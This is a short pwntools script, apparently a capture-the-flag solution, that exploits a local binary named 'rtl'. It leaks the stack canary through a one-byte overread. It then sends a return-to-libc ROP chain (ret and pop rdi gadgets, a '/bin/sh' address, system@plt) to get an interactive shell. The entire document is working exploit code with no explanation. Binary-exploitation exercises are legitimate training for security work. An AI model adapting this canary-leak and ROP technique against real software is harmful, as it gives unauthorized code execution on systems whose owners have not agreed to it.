from pwn import *

p = process("./rtl")
e = ELF("./rtl")

def slog(name, addr): return success(": ".join([name, hex(addr)]))



buf = b"A"*0x39
p.sendafter("Buf: ",buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary",cnry)



system_plt = e.plt["system"]
binsh = 0x402004
pop_rdi = 0x00000000004011bd
ret = 0x00000000004012c5
slog("system_plt",system_plt)

code = b"A"*0x38 + p64(cnry) + b"B"*0x8
code += p64(ret)
code += p64(pop_rdi)
code += p64(binsh)
code += p64(system_plt)

p.sendafter("Buf: ", code)
p.interactive()
